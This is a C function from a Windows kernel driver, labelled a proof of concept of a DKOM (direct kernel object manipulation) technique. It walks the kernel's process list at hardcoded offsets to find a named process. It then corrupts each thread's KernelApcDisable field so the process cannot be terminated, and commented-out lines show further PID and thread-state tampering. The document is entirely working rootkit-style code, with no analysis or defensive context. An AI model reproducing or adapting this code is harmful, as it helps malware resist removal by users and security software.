int protectProcessusDKOM(char* processus)
{
    /* Proof of concept of sudami's dkom technic by 0vercl0k .*/

    PETHREAD                     pCurrentEthread;
    PEPROCESS                    pCurrentEprocess;
    PLIST_ENTRY                  pCurrentListEntry;
    ULONG                        firstValue;

    pCurrentEprocess  = IoGetCurrentProcess();
    pCurrentListEntry = (PLIST_ENTRY)((PUCHAR)pCurrentEprocess + 0x88);    //   +0x088 ActiveProcessLinks : _LIST_ENTRY
    firstValue        = (ULONG)pCurrentListEntry;


    do
    {
        if(strncmp(processus , (PUCHAR)pCurrentEprocess + 0x174 , strlen(processus)) == 0)
            break;

        pCurrentListEntry = pCurrentListEntry->Flink;
        pCurrentEprocess  = (PEPROCESS)((PUCHAR)pCurrentListEntry - 0x88);   //   +0x088 ActiveProcessLinks : _LIST_ENTRY

    }while( (ULONG)pCurrentListEntry != firstValue );

    if((ULONG)pCurrentListEntry == firstValue)
        return 0;

    /*  Protection changement du PID dans l'eprocess */
    //*(PULONG)((PUCHAR)pEprocessCourante + 0x84) = 0x7;                                                //   +0x084 UniqueProcessId  : Ptr32 Void

    pCurrentListEntry                           = (PLIST_ENTRY)((PUCHAR)pCurrentEprocess + 0x50);    //       +0x050 ThreadListHead   : _LIST_ENTRY
    pCurrentEthread                             = (PETHREAD)((PUCHAR)pCurrentListEntry->Flink - 0x1b0);
    firstValue                                  = (ULONG)pCurrentListEntry;

    do
    {
        /* Protection changement des états des threads en TERMINATED */
        //*((PUCHAR)pEthreadCurrent + 0x2d)          = 0x4;    //+0x02d State            : Uchar

        /* Positionne le Bit 0 à 1 */
        //*(PULONG)((PUCHAR)pEthreadCurrent + 0x248) |= 0x1;

        /* Protection changement du PID dans les ethreads */
        //*(PULONG)((PUCHAR)pEthreadCurrent + 0x1ec) = 0x7;    //+0x1ec Cid              : _CLIENT_ID            +0x000 UniqueProcess    : Ptr32 Void

        /* Protection desactivation des APCs Kernels */
        if( *(PULONG)((PUCHAR)pCurrentEthread + 0x0d4) == 0)
            *(PULONG)((PUCHAR)pCurrentEthread + 0x0d4) = 0xa98ac7;


        //DbgPrint("[ THREAD : %x ] KernelApcDisable : %x.", pEthreadCurrent , *(PULONG)((PUCHAR)pEthreadCurrent + 0x0d4)); //      +0x0d4 KernelApcDisable :

        pCurrentListEntry = pCurrentListEntry->Flink;
        pCurrentEthread   = (PETHREAD)((PUCHAR)pCurrentListEntry - 0x1b0);  //      +0x1b0 ThreadListEntry  : _LIST_ENTRY

    }while( (ULONG)pCurrentListEntry != firstValue );
    return 1;
}
